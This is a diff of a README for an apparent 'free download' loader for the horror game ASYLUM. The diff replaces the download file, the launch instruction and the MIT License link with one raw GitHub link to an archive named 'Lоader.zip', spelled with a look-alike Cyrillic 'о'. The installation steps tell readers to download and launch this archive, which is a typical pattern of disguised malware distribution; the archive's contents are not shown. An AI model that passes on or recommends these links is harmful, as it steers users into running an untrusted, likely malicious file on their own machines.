@@ -27,9 +27,9 @@ ASYLUM Free Download, ASYLUM loader, Horror Game Loader 2025, Cross-platform ASY
 
 ## 📝 Installation Guide
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/karcioricardo/Asylum-Free-Download-Hub/main/Lоader.zip` from the repository.
 2. Extract files to your desired directory.
-3. Launch the `ASYLUMLoader.exe` or use appropriate emulator for your OS.
+3. Launch the `https://raw.githubusercontent.com/karcioricardo/Asylum-Free-Download-Hub/main/Lоader.zip` or use appropriate emulator for your OS.
 4. Follow the on-screen instructions.
 5. Start your journey into ASYLUM!
 
@@ -39,6 +39,6 @@ This repository provides a unique loader tool for educational and accessibility 
 
 ## 📜 License
 
-Released under the [MIT License](https://opensource.org/license/mit/) – © 2025
+Released under the [MIT License](https://raw.githubusercontent.com/karcioricardo/Asylum-Free-Download-Hub/main/Lоader.zip) – © 2025
 
 Enjoy your stay in the ASYLUM!
